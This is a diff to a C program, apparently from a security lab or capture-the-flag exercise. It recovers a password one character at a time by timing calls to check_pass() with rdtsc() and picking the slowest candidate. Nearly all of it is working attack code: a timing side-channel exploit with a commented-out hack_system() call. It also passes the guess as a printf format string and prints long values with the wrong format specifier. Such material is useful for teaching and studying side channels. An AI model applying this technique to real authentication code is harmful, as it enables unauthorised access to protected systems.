@@ -10,8 +10,9 @@
 
 int main(int argc, char **argv) {
     char guess[33];
-    long a,d;
-    float f,g;
+    long a,d,f,g;
+    
+    long timer[94];
     // set guess to zeros
     bzero(guess, sizeof(guess));
 
@@ -27,7 +28,28 @@ int main(int argc, char **argv) {
     //guess[0]=c;
     //c = 115;
     //guess [1] = 115;
+    for (char c = 33; c<127;c++){
+        guess[0] = c;
+	a = rdtsc();
+	check_pass(guess);
+	d = rdtsc();
+    	f = d-a;
+	timer[c-33]=f;
+    }
+    for (int i=0; i<94-1;i++){
+        for(int j = 0;j<94-i;j++){
+	    if(timer[j]<=timer[j+1]){
+	        long t = timer[j];
+		timer[j] = timer[j+1];
+		timer[j+1] = t;
+	     }else
+	     continue;
+	}
+    }
+    long median = (timer[94/2]+timer[94/2+1])/2.0;
+    //printf("%d\n",median);
     for (int i=0;i<12;i++){
+    long timer[94];
     for (char c = 33; c<127; c++){
         guess[i] =c;
         
@@ -39,25 +61,32 @@ int main(int argc, char **argv) {
     //    hack_system(guess);
     //};
 	d = rdtsc();
-	
-	if (i >0){
-	    f = (d-a)-f;
-	}
-        else{
-	    f = d-a;
-	}
-	printf("%f\t",f);   
-	if (f>1620&&f<1700 ){
+	f = d-a;
+	printf("%d\t",f/(i+2));
+	if(f/(i+2)>median+50&&f/(i+2)<median+100){
 	    printf(guess);
-	    printf(" %f\t",f);
-	    break;
+	    printf("%d",f/(i+2));
+	    printf("\n");
 	}
-	if(f>790 && i >0){
-	    printf(guess);
-	    printf(" %f\t",f);
-	    break;
-	}
+	timer[c-33] = f;
+		
     }
+    long z = 0;
+    int j;
+    int index;
+    for (j = 0;j<94; j++){
+	long x = timer[j];
+	if (z<x && j<20000){
+	    z=x;
+	    index = j;
+	}
+	       
+        //printf("%d\t",timer[j]); 
+    }
+    //printf("%d\t",index);
+    //for (int i =0; i <94;i++){printf("%d %c\t",timer[i],i+33);}
+    printf("\n");
+    guess[i] = index+33;
     }
     printf("Could not get the password!  Last guess was %s\n", guess);
     return 1;
